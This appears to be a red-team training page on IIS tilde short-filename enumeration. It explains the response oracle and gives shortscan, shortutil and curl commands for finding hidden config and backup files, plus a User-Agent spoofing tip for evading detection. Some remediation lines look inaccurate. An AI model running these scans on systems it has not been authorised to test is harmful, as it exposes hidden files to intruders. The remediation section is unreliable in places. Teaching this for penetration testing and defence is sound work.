---
layout: training-page
title: "IIS Short Filename Enumeration — Red Team Academy"
module: "Web Hacking"
tags:
  - iis
  - shortscan
  - tilde-enumeration
  - windows
  - information-disclosure
  - web-hacking
page_key: "web-iis-shortscan"
render_with_liquid: false
---

# IIS Short Filename Enumeration (Tilde ~)

IIS on Windows converts long filenames to 8.3 format (e.g., `SecretBackup.bak` → `SECRET~1.BAK`). By sending requests containing the tilde character (`~`), an attacker can confirm whether specific short-format filenames exist — even when directory listing is disabled. This allows discovery of hidden files, backup copies, source files, and admin scripts that are not linked anywhere in the application.

The vulnerability has existed since early IIS versions. Shortscan is the modern tool for exploiting it, using checksum-based autocomplete to recover full filenames from 8.3 names.

## The Vulnerability

```
# IIS 8.3 short filename format:
# LongFilename.extension → LONGFI~1.EXT (first 6 chars + ~1 + extension)
# Examples:
#   SecretBackup.bak  →  SECRET~1.BAK
#   web.config.bak    →  WEB~1.CON   (or WEB.CON~1)
#   AdminPortal.aspx  →  ADMINP~1.ASP

# Detection: IIS responds differently to:
# http://target.com/secret~1.bak     → 404 "File Not Found" (exists but denied)
# http://target.com/doesnotexist~1.bak → 400 "Bad Request" or different 404

# The difference in HTTP responses is the oracle.
# Status code variance depends on IIS version and configuration.
```

## Install Shortscan

```
# Go install (requires Go 1.18+):
go install github.com/bitquark/shortscan/cmd/shortscan@latest

# Also install shortutil (for wordlist/rainbow table generation):
go install github.com/bitquark/shortscan/cmd/shortutil@latest

# Verify:
shortscan --version
shortutil --help
```

## Basic Usage

```
# Check if a site is vulnerable (no file enumeration yet):
shortscan --isvuln http://target.com/

# Basic scan (enumerate all short filenames):
shortscan http://target.com/

# Scan with full URL output (shows complete paths found):
shortscan --fullurl http://target.com/

# Scan multiple URLs from file:
shortscan @urls.txt

# JSON output for scripting:
shortscan -o json http://target.com/ | jq .

# Example output:
# ADMINI~1.ASP  → admin_interface.aspx (autocompleted)
# BACKUP~1.ZIP  → backup_2023.zip (partial — needs manual guess)
# WEB~1.CON     → web.config (confirmed)
```

## Performance Tuning

```
# Increase concurrency for faster scanning:
shortscan -c 50 http://target.com/

# Set custom timeout (default 10s):
shortscan -t 5 http://target.com/

# Stabilize against unreliable servers (more requests, better accuracy):
shortscan --stabilise http://target.com/

# Patience level for vulnerability detection:
shortscan -p 1 http://target.com/    # Very patient (more reliable on flaky servers)
```

## Authentication / Custom Headers

```
# Scan with authentication:
shortscan -H "Authorization: Basic dXNlcjpwYXNz" http://target.com/

# Multiple headers:
shortscan \
  -H "Authorization: Bearer TOKEN" \
  -H "X-Custom-Header: value" \
  http://target.com/

# Session cookie:
shortscan -H "Cookie: PHPSESSID=abc123; auth=token" http://target.com/

# Scan specific path:
shortscan http://target.com/api/
shortscan http://target.com/admin/
```

## Autocomplete Modes

```
# Shortscan attempts to recover the full filename from the 8.3 short name.
# Method selection is usually automatic, but can be overridden:

# Auto (default — tries to detect best method):
shortscan -a auto http://target.com/

# HTTP method magic (sends OPTIONS/HEAD/GET to differentiate):
shortscan -a method http://target.com/

# Status code comparison:
shortscan -a status http://target.com/

# Levenshtein distance (response body similarity):
shortscan -a distance http://target.com/

# Disable autocomplete (report short names only, no full name recovery):
shortscan -a none http://target.com/
```

## Custom Wordlist / Rainbow Table

```
# Shortscan uses checksum matching to find full filenames.
# Create a rainbow table from a custom wordlist for better coverage:

# Step 1: Build rainbow table from wordlist
shortutil wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt > raft_rainbow.rainbow

# Step 2: Use rainbow table with shortscan
shortscan -w raft_rainbow.rainbow http://target.com/

# For targeted assessment (know what you're looking for):
cat <<EOF > custom_words.txt
web.config
web.config.bak
backup.zip
database.sql
admin.aspx
login.aspx
config.asp
EOF
shortutil wordlist custom_words.txt > custom.rainbow
shortscan -w custom.rainbow http://target.com/

# Generate checksum for a specific filename:
shortutil checksum "web.config.bak"
# Output: WEB.CON~1 (the 8.3 short name to look for)
```

## Manual Verification

```
# Manually confirm a short filename using curl:
# If TARGET~1.EXT returns 404 (not 400), the file exists

# Vulnerable server response pattern:
# Existing short name: HTTP/1.1 404 Not Found  (file exists but not accessible)
# Non-existing name:  HTTP/1.1 400 Bad Request (or different error)

# Test for web.config:
curl -v "http://target.com/web~1.con" 2>&1 | grep "HTTP/"

# Test for backup files:
for name in backup bak old copy temp; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/${name}~1.zip")
  echo "$code $name~1.zip"
done

# Common targets worth checking:
# web~1.con       → web.config
# web~1.bak       → web.config.bak
# global~1.asa    → global.asa (old IIS)
# web~1.xml       → web.xml
# backup~1.zip    → backup*.zip
# admin~1.asp*    → admin*.aspx
```

## Remediation Reference

```
# Check if vulnerable (admin access):
# Run from Windows Server cmd prompt:
dir /x C:\inetpub\wwwroot\   # Shows both long and 8.3 names

# Disable 8.3 name generation (requires restart):
fsutil 8dot3name set C: 1

# Disable IIS tilde feature (regedit — requires IIS restart):
# HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters
# NtfsDisable8dot3NameCreation = 1

# Or via appcmd:
appcmd set config /section:requestFiltering /allowDoubleEscaping:false
```

## Detection

```
# Shortscan generates requests containing ~ character:
# GET /secret~1.bak HTTP/1.1
# GET /admin~1.aspx HTTP/1.1

# IDS/WAF detection rules:
# - URL contains tilde (~) followed by digit: ~[0-9]
# - Rapid sequential requests with incrementing ~N patterns
# - User-Agent: shortscan/VERSION (default UA)

# Modify user agent to blend in:
shortscan -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  http://target.com/
```

## Resources

- Shortscan — `github.com/bitquark/shortscan`
- Original research (Soroush Dalili) — `soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf`
- SecLists IIS wordlists — `/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt`
- Related: [Source Code Disclosure](/web/source-code-disclosure/)
- Related: [Hidden Parameters & Content Discovery](/web/hidden-parameters/)
